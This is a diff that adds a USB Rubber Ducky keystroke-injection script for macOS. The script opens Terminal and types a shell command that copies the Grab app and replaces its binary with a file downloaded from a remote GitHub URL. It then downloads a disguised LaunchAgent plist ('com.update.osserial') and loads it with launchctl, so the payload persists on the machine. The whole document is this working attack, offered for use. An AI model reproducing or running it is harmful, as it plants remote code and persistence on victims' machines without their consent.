@@ -1,0 +1,19 @@
+DELAY 500
+COMMAND SPACE
+DELAY 1000
+STRING Terminal
+DELAY 500
+COMMAND O
+DELAY 200
+ENTER
+DELAY 500
+COMMAND N
+DELAY 200
+ENTER
+DELAY 200
+STRING cd /Applications/Utilities/; mkdir -p /Users/Shared/HEHE; cp -R Grab.app/ /Users/Shared/HEHE/; cd /Users/Shared/HEHE/Contents/MacOS; echo -n > Grab; cp Grab ../../; cd /Users/Shared/HEHE; curl -O https://raw.githubusercontent.com/leperjulien/VariousStuff/master/rubberduck; cat rubberduck > Grab; cd ~/Library/LaunchAgents; curl -O https://raw.githubusercontent.com/leperjulien/VariousStuff/master/com.update.osserial.plist; launchctl load -w com.update.osserial.plist
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+STRING FINIIIISH
